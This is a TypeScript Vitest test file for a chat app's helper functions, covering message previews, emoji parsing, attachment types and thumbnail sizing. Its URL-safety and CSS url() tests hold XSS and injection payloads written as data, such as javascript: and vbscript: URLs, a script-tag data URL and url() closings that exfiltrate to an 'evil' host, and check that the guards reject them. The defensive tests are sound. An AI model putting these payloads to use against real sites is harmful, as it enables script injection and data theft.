import { describe, expect, it } from "vitest";

import { attachmentTypeFromExt, buildMessageParts, conversationListPreview } from "./data";
import type { Message, MessageAttachment, MessageBlock } from "./data";
import { afterEach } from "vitest";

import { cssUrlSafe, formatRichText, isSafeUrl, messageReplyPreview, thumbWidth } from "./utils";

function makeMessage(
  partial: Omit<Partial<Message>, "parts"> & {
    blocks?: MessageBlock[];
    attachments?: MessageAttachment[];
  },
): Message {
  const { text = "", blocks, attachments, ...rest } = partial;
  return {
    id: "m1",
    conversationId: "c1",
    direction: "in",
    sentAt: "2026-05-19T00:00:00.000Z",
    text,
    parts: buildMessageParts(text, blocks, attachments),
    ...rest,
  };
}

describe("messageReplyPreview", () => {
  it("returns trimmed text when present", () => {
    expect(messageReplyPreview(makeMessage({ text: "  hi there  " }))).toBe("hi there");
  });

  it("falls back to [图片] for image-only blocks (empty text)", () => {
    const msg = makeMessage({
      text: "",
      blocks: [{ type: "image", url: "data:image/png;base64,xxx" }],
    });
    expect(messageReplyPreview(msg)).toBe("[图片]");
  });

  it("falls back to [图片] for image attachment", () => {
    const msg = makeMessage({
      text: "",
      attachments: [{ type: "image", url: "https://x/y.png" }],
    });
    expect(messageReplyPreview(msg)).toBe("[图片]");
  });

  it("falls back to [文件] for file attachment", () => {
    const msg = makeMessage({
      text: "",
      attachments: [{ type: "file", url: "blob:abc", name: "x.pdf" }],
    });
    expect(messageReplyPreview(msg)).toBe("[文件]");
  });

  it("falls back to [语音] for voice attachment", () => {
    const msg = makeMessage({
      text: "",
      attachments: [{ type: "voice", url: "blob:v", durationSec: 5 }],
    });
    expect(messageReplyPreview(msg)).toBe("[语音]");
  });

  it("falls back to [视频] for video attachment", () => {
    const msg = makeMessage({
      text: "",
      attachments: [{ type: "video", url: "blob:vd" }],
    });
    expect(messageReplyPreview(msg)).toBe("[视频]");
  });

  it("prefers text over blocks/attachments when both are present", () => {
    const msg = makeMessage({
      text: "hello",
      blocks: [{ type: "image", url: "x" }],
      attachments: [{ type: "file", url: "y" }],
    });
    expect(messageReplyPreview(msg)).toBe("hello");
  });

  it("whitespace-only text falls through to attachment placeholder", () => {
    const msg = makeMessage({
      text: "   \n  ",
      attachments: [{ type: "image", url: "x" }],
    });
    expect(messageReplyPreview(msg)).toBe("[图片]");
  });

  it("returns empty string when no content is available", () => {
    expect(messageReplyPreview(makeMessage({ text: "" }))).toBe("");
  });
});

describe("isSafeUrl", () => {
  it("放行 http/https 与应用自有 mediaproxy 协议", () => {
    expect(isSafeUrl("http://e.example/a.png", "link")).toBe(true);
    expect(isSafeUrl("https://e.example/a.png", "image")).toBe(true);
    expect(isSafeUrl("mediaproxy://abc", "image")).toBe(true);
    expect(isSafeUrl("mediaproxy://abc", "link")).toBe(true);
  });

  it("image 额外放行 data:image/ 与 blob:,但 link 不放行", () => {
    expect(isSafeUrl("data:image/png;base64,xxx", "image")).toBe(true);
    expect(isSafeUrl("blob:abc", "image")).toBe(true);
    expect(isSafeUrl("data:image/png;base64,xxx", "link")).toBe(false);
    expect(isSafeUrl("blob:abc", "link")).toBe(false);
  });

  it("拦截危险协议 javascript/file/vbscript 与 data:text/html", () => {
    expect(isSafeUrl("javascript:alert(1)", "link")).toBe(false);
    expect(isSafeUrl("file:///etc/passwd", "link")).toBe(false);
    expect(isSafeUrl("vbscript:msgbox(1)", "image")).toBe(false);
    expect(isSafeUrl("data:text/html,<script>alert(1)</script>", "image")).toBe(false);
  });

  it("拦截内嵌控制字符的协议绕过", () => {
    expect(isSafeUrl("java\nscript:alert(1)", "link")).toBe(false);
    expect(isSafeUrl("  java\tscript:alert(1)  ", "link")).toBe(false);
  });

  it("放行站内相对路径,但拦截协议相对 //host", () => {
    expect(isSafeUrl("/img/a01.png", "image")).toBe(true);
    expect(isSafeUrl("foo/bar.png", "image")).toBe(true);
    expect(isSafeUrl("//evil.example/x", "image")).toBe(false);
  });

  it("空值返回 false", () => {
    expect(isSafeUrl(undefined, "link")).toBe(false);
    expect(isSafeUrl("", "image")).toBe(false);
    expect(isSafeUrl("   ", "link")).toBe(false);
  });
});

describe("cssUrlSafe:CSS url() 上下文专用守卫", () => {
  it("放行协议安全且无 CSS 元字符的正常 URL", () => {
    expect(cssUrlSafe("https://e.example/a.png", "image")).toBe("https://e.example/a.png");
    expect(cssUrlSafe("https://e.example/v.mp4", "link")).toBe("https://e.example/v.mp4");
    expect(cssUrlSafe("/img/a01.png", "image")).toBe("/img/a01.png");
    expect(cssUrlSafe("mediaproxy://abc", "image")).toBe("mediaproxy://abc");
  });

  it("拒绝含引号/括号/反斜杠等 CSS 元字符的 URL(防 url() 闭合注入)", () => {
    // 视频缩略图无引号 url() 注入向量:用 ) 闭合再追加 CSS。
    expect(cssUrlSafe("https://e/x.jpg);background:url(https://evil/exfil?c=", "link")).toBeNull();
    // 头像 url("...") 注入向量:用 " 闭合字符串。
    expect(cssUrlSafe('https://e/a.jpg");content:url("https://evil/exfil', "image")).toBeNull();
    expect(cssUrlSafe("https://e/a.jpg'", "image")).toBeNull();
    expect(cssUrlSafe("https://e/a.jpg\\", "image")).toBeNull();
    expect(cssUrlSafe("https://e/a b.jpg", "image")).toBeNull(); // 含空白
  });

  it("协议不安全时返回 null(继承 isSafeUrl 的协议白名单)", () => {
    expect(cssUrlSafe("javascript:alert(1)", "link")).toBeNull();
    expect(cssUrlSafe("data:text/html,x", "image")).toBeNull();
    expect(cssUrlSafe(undefined, "image")).toBeNull();
  });
});

// 缩略图宽度的 DPR 自适应 + 封顶逻辑(「切会话 + 滑动图片历史」内存优化里唯一可在 jsdom
// faithful 验证的部分:它决定 webview 解码位图的面积 = 内存大头)。锁死:低分屏取显示宽(省内存)、
// 视网膜维持历史 384(画质不变)、任何情况封顶 384(永不比旧硬编码更耗内存)。overscan / 虚拟化
// 阈值的内存收益依赖真实布局,jsdom 无法复现,不在此测。
describe("thumbWidth:DPR 自适应缩略图宽(封顶 384)", () => {
  const setDpr = (v: number) =>
    Object.defineProperty(window, "devicePixelRatio", { configurable: true, value: v });
  afterEach(() => setDpr(1)); // jsdom 默认 1,复位避免污染其他用例

  it("低分屏(1×):取显示宽,解码位图最小", () => {
    setDpr(1);
    expect(thumbWidth(192)).toBe(192); // 192 盒(独立图 / 附件图)
    expect(thumbWidth(260)).toBe(260); // 内联图(max-w 260)
  });

  it("视网膜(2×):与旧硬编码 384 一致,画质不变", () => {
    setDpr(2);
    expect(thumbWidth(192)).toBe(384); // 192×2
    expect(thumbWidth(260)).toBe(384); // 260×2=520 → 封顶 384
  });

  it("超高 dpr(3×):dpr 系数上限 2,再被 384 总封顶", () => {
    setDpr(3);
    expect(thumbWidth(192)).toBe(384);
    expect(thumbWidth(260)).toBe(384);
  });

  it("中等 dpr(1.5×,常见于 Windows):按比例缩,仍不超 384", () => {
    setDpr(1.5);
    expect(thumbWidth(192)).toBe(288); // 192×1.5
    expect(thumbWidth(260)).toBe(384); // 260×1.5=390 → 封顶 384
  });

  it("任何 cssWidth 都不超过 384(永不比旧固定值更耗内存)", () => {
    setDpr(2);
    for (const w of [192, 260, 300, 400]) {
      expect(thumbWidth(w)).toBeLessThanOrEqual(384);
    }
  });
});

describe("formatRichText:微信表情映射", () => {
  it("白名单内的 [微笑] → emoji-image 段(value 保留原文,src 指向本地 PNG)", () => {
    const segs = formatRichText("[微笑]");
    expect(segs).toHaveLength(1);
    const seg = segs[0];
    expect(seg.type).toBe("emoji-image");
    if (seg.type !== "emoji-image") throw new Error("unreachable");
    expect(seg.value).toBe("[微笑]");
    expect(seg.src).toMatch(/^\/wechat-emojis\/\d{3}\.png$/);
  });

  it("不在白名单的方括号文本(如 [链接])原样作为普通文字,不误伤", () => {
    const segs = formatRichText("[链接]");
    expect(segs).toEqual([{ type: "text", value: "[链接]" }]);
  });

  it("文字 + 表情 + 文字:顺序与分段正确", () => {
    const segs = formatRichText("你好[微笑]再见");
    expect(segs.map((s) => s.type)).toEqual(["text", "emoji-image", "text"]);
    expect(segs[0]).toEqual({ type: "text", value: "你好" });
    expect(segs[2]).toEqual({ type: "text", value: "再见" });
  });

  it("连续多个表情各自成段", () => {
    const segs = formatRichText("[微笑][撇嘴][色]");
    expect(segs).toHaveLength(3);
    expect(segs.every((s) => s.type === "emoji-image")).toBe(true);
  });

  it("与链接共存:链接仍走 link 段,表情走 emoji-image 段", () => {
    const segs = formatRichText("[微笑] https://example.com");
    expect(segs.map((s) => s.type)).toEqual(["emoji-image", "text", "link"]);
  });
});

describe("attachmentTypeFromExt:按扩展名判定附件类型", () => {
  it("silk/sil → voice(收侧边界:只带后缀、无 attachmentType 码值时不误判成文件)", () => {
    expect(attachmentTypeFromExt("silk")).toBe("voice");
    expect(attachmentTypeFromExt("sil")).toBe("voice");
    expect(attachmentTypeFromExt("SILK")).toBe("voice"); // 大小写不敏感
  });

  it("既有分类不回归", () => {
    expect(attachmentTypeFromExt("amr")).toBe("voice");
    expect(attachmentTypeFromExt("mp3")).toBe("voice");
    expect(attachmentTypeFromExt("png")).toBe("image");
    expect(attachmentTypeFromExt("mp4")).toBe("video");
    expect(attachmentTypeFromExt("pdf")).toBe("file");
  });
});

describe("conversationListPreview:接待列表预览兜底", () => {
  it("summary 非空时原样返回(与类型无关)", () => {
    expect(conversationListPreview("[文件]", 3, 1_700_000_000_000)).toBe("[文件]");
    expect(conversationListPreview("你好", 99, 1_700_000_000_000)).toBe("你好");
  });

  it("空白占位行(type=0 且 time=0,open_friend_conversation 无记录路径)→ 空预览,不显示[未知消息]", () => {
    expect(conversationListPreview("", 0, 0)).toBe("");
  });

  it("有消息但类型不识别(type=99、有时间、summary 空)→ 回退[未知消息]", () => {
    expect(conversationListPreview("", 99, 1_700_000_000_000)).toBe("[未知消息]");
  });

  it("有消息但类型缺省(type=0 但 time>0,summary 空)→ 回退[未知消息]", () => {
    expect(conversationListPreview("", 0, 1_700_000_000_000)).toBe("[未知消息]");
  });

  it("已知类型 summary 空 → 空预览(现状不变)", () => {
    expect(conversationListPreview("", 1, 1_700_000_000_000)).toBe("");
  });
});
